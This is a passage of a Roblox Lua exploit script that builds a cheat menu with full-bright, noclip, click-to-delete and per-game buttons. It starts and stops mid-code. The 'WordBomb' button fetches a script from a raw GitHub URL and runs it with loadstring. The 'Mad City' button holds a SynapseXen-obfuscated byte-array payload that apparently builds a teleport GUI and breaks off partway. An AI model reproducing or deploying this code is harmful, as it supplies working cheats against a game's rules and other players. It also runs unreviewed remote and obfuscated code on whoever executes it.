						game:GetService("Lighting").FogEnd = 786543
						game:GetService("Lighting").GlobalShadows = false
						game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
					end
					LatestValue = not LatestValue
				end
			end
		end)
	end

	_G.FullBrightExecuted = true
	_G.FullBrightEnabled = not _G.FullBrightEnabled
end)

UICorner_43.Parent = FullBright

NoClip.Name = "NoClip"
NoClip.Parent = Scripts
NoClip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NoClip.Position = UDim2.new(0.282868534, 0, 0.5024845, 0)
NoClip.Size = UDim2.new(0, 71, 0, 50)
NoClip.Font = Enum.Font.SciFi
NoClip.Text = "NoClip"
NoClip.TextColor3 = Color3.fromRGB(0, 0, 0)
NoClip.TextScaled = true
NoClip.TextSize = 14.000
NoClip.TextWrapped = true
NoClip.MouseButton1Click:connect(function()
	noclip = false
	game:GetService('RunService').Stepped:connect(function()
		if noclip then
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	plr = game.Players.LocalPlayer
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(key)

		if key == "e" then
			noclip = not noclip
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	print('Loaded')
	print('Press "E" to noclip')
end)

UICorner_44.Parent = NoClip

WordBomb.Name = "WordBomb"
WordBomb.Parent = Scripts
WordBomb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WordBomb.Position = UDim2.new(0, 0, 0.501640618, 0)
WordBomb.Size = UDim2.new(0, 71, 0, 50)
WordBomb.Font = Enum.Font.SciFi
WordBomb.Text = "WordBomb"
WordBomb.TextColor3 = Color3.fromRGB(0, 0, 0)
WordBomb.TextScaled = true
WordBomb.TextSize = 14.000
WordBomb.TextWrapped = true
WordBomb.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/Unpatchabomb/master/Unpatchabomb'),true))()
end)

UICorner_45.Parent = WordBomb

ctrldel.Name = "ctrldel"
ctrldel.Parent = Scripts
ctrldel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ctrldel.Position = UDim2.new(0, 0, 0.543834686, 0)
ctrldel.Size = UDim2.new(0, 71, 0, 50)
ctrldel.Font = Enum.Font.SciFi
ctrldel.Text = "Ctrl+Del"
ctrldel.TextColor3 = Color3.fromRGB(0, 0, 0)
ctrldel.TextSize = 18.000
ctrldel.TextWrapped = true
ctrldel.MouseButton1Click:connect(function()
	local Plr = game:GetService("Players").LocalPlayer
	local Mouse = Plr:GetMouse()

	Mouse.Button1Down:connect(function()
		if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then return end
		if not Mouse.Target then return end
		Mouse.Target:Destroy()
	end)
end)

UICorner_46.Parent = ctrldel

MadCity.Name = "MadCity"
MadCity.Parent = Scripts
MadCity.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MadCity.Position = UDim2.new(0.282868534, 0, 0.543834686, 0)
MadCity.Size = UDim2.new(0, 71, 0, 50)
MadCity.Font = Enum.Font.SciFi
MadCity.Text = "Mad City"
MadCity.TextColor3 = Color3.fromRGB(0, 0, 0)
MadCity.TextScaled = true
MadCity.TextSize = 14.000
MadCity.TextWrapped = true
MadCity.MouseButton1Click:connect(function()
	function SynapseXenIllIlllIllIlllIlllIlllIll(SynapseXenIllIlllIllIlllIlllIlllIll) if (SynapseXenIllIlllIllIlllIlllIlllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (SynapseXenIllIlllIllIlllIlllIlllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IllIllIllIllI = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;function IllIIIIllIIIIIl(IllIllIllIllI) function IIllllIIllll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IIllllIIllll) end end end;IllIIIIllIIIIIl(900283);function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IIllllIIllll) local IIllllIIllll = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = loadstring;local IlIlIlIlIlIlIlIlII = {'\45','\45','\47','\47','\32','\68','\101','\99','\111','\109','\112','\105','\108','\101','\100','\32','\67','\111','\100','\101','\46','\32','\10','\108','\111','\99','\97','\108','\32','\97','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\83','\99','\114','\101','\101','\110','\71','\117','\105','\34','\41','\108','\111','\99','\97','\108','\32','\98','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\70','\114','\97','\109','\101','\34','\41','\108','\111','\99','\97','\108','\32','\99','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\83','\99','\114','\111','\108','\108','\105','\110','\103','\70','\114','\97','\109','\101','\34','\41','\108','\111','\99','\97','\108','\32','\100','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\101','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\102','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\103','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\104','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\105','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\106','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\107','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\108','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\109','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\110','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\111','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\83','\99','\114','\111','\108','\108','\105','\110','\103','\70','\114','\97','\109','\101','\34','\41','\108','\111','\99','\97','\108','\32','\112','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\113','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\114','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\115','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\117','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\118','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\119','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\120','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\121','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\122','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\65','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\66','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\67','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\68','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\69','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\76','\97','\98','\101','\108','\34','\41','\108','\111','\99','\97','\108','\32','\70','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\76','\97','\98','\101','\108','\34','\41','\108','\111','\99','\97','\108','\32','\71','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\76','\97','\98','\101','\108','\34','\41','\108','\111','\99','\97','\108','\32','\72','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\73','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\111','\120','\34','\41','\108','\111','\99','\97','\108','\32','\74','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\75','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\76','\97','\98','\101','\108','\34','\41','\108','\111','\99','\97','\108','\32','\76','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\77','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\111','\120','\34','\41','\108','\111','\99','\97','\108','\32','\78','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\79','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\80','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\108','\111','\99','\97','\108','\32','\81','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\84','\101','\120','\116','\66','\117','\116','\116','\111','\110','\34','\41','\97','\46','\78','\97','\109','\101','\61','\34','\77','\97','\100','\67','\105','\116','\121','\71','\117','\105','\34','\97','\46','\80','\97','\114','\101','\110','\116','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\58','\87','\97','\105','\116','\70','\111','\114','\67','\104','\105','\108','\100','\40','\34','\80','\108','\97','\121','\101','\114','\71','\117','\105','\34','\41','\97','\46','\90','\73','\110','\100','\101','\120','\66','\101','\104','\97','\118','\105','\111','\114','\61','\69','\110','\117','\109','\46','\90','\73','\110','\100','\101','\120','\66','\101','\104','\97','\118','\105','\111','\114','\46','\83','\105','\98','\108','\105','\110','\103','\59','\98','\46','\78','\97','\109','\101','\61','\34','\77','\97','\100','\70','\114','\97','\109','\101','\34','\98','\46','\80','\97','\114','\101','\110','\116','\61','\97','\59','\98','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\41','\98','\46','\66','\111','\114','\100','\101','\114','\83','\105','\122','\101','\80','\105','\120','\101','\108','\61','\50','\59','\98','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\50','\55','\57','\49','\56','\55','\50','\48','\50','\44','\48','\44','\48','\46','\51','\48','\50','\48','\50','\51','\57','\55','\55','\44','\48','\41','\98','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\51','\56','\52','\44','\48','\44','\49','\57','\55','\41','\99','\46','\78','\97','\109','\101','\61','\34','\116','\101','\108','\101','\112','\111','\114','\116','\115','\34','\99','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\99','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\41','\99','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\55','\51','\57','\53','\56','\51','\51','\49','\51','\44','\48','\44','\48','\46','\49','\50','\54','\57','\48','\51','\53','\52','\57','\44','\48','\41','\99','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\48','\48','\44','\48','\44','\49','\55','\50','\41','\100','\46','\78','\97','\109','\101','\61','\34','\66','\97','\110','\107','\34','\100','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\100','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\100','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\100','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\48','\51','\49','\50','\50','\57','\57','\49','\55','\44','\48','\41','\100','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\100','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\100','\46','\84','\101','\120','\116','\61','\34','\66','\97','\110','\107','\34','\100','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\100','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\101','\46','\78','\97','\109','\101','\61','\34','\74','\101','\119','\101','\108','\34','\101','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\101','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\101','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\101','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\48','\57','\52','\54','\56','\49','\54','\56','\55','\55','\44','\48','\41','\101','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\101','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\101','\46','\84','\101','\120','\116','\61','\34','\74','\101','\119','\101','\108','\114','\121','\34','\101','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\101','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\102','\46','\78','\97','\109','\101','\61','\34','\67','\97','\115','\105','\110','\111','\34','\102','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\102','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\102','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\102','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\49','\54','\48','\54','\55','\49','\53','\51','\50','\44','\48','\41','\102','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\102','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\102','\46','\84','\101','\120','\116','\61','\34','\67','\97','\115','\105','\110','\111','\34','\102','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\102','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\103','\46','\78','\97','\109','\101','\61','\34','\71','\117','\110','\115','\116','\111','\114','\101','\34','\103','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\103','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\103','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\103','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\50','\50','\54','\54','\54','\49','\51','\56','\52','\44','\48','\41','\103','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\103','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\103','\46','\84','\101','\120','\116','\61','\34','\71','\117','\110','\32','\83','\116','\111','\114','\101','\34','\103','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\103','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\104','\46','\78','\97','\109','\101','\61','\34','\115','\104','\105','\112','\34','\104','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\104','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\104','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\104','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\50','\56','\55','\53','\55','\53','\48','\57','\54','\44','\48','\41','\104','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\104','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\104','\46','\84','\101','\120','\116','\61','\34','\83','\104','\105','\112','\34','\104','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\104','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\105','\46','\78','\97','\109','\101','\61','\34','\71','\97','\114','\97','\103','\101','\34','\105','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\105','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\105','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\105','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\51','\52','\56','\52','\56','\56','\56','\48','\56','\44','\48','\41','\105','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\105','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\105','\46','\84','\101','\120','\116','\61','\34','\71','\97','\114','\97','\103','\101','\34','\105','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\105','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\106','\46','\78','\97','\109','\101','\61','\34','\99','\114','\105','\109','\98','\97','\115','\101','\34','\106','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\106','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\106','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\106','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\52','\49','\52','\52','\55','\56','\54','\54','\44','\48','\41','\106','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\106','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\106','\46','\84','\101','\120','\116','\61','\34','\67','\114','\105','\109','\32','\66','\97','\115','\101','\34','\106','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\106','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\107','\46','\78','\97','\109','\101','\61','\34','\80','\111','\108','\105','\99','\101','\34','\107','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\107','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\107','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\107','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\52','\55','\53','\51','\57','\50','\51','\55','\49','\44','\48','\41','\107','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\107','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\107','\46','\84','\101','\120','\116','\61','\34','\80','\111','\108','\105','\99','\101','\34','\107','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\107','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\108','\46','\78','\97','\109','\101','\61','\34','\72','\101','\114','\111','\34','\108','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\108','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\108','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\108','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\53','\51','\54','\51','\48','\54','\48','\56','\51','\44','\48','\41','\108','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\108','\46','\70','\111','\110','\116','\61','\69','\110','\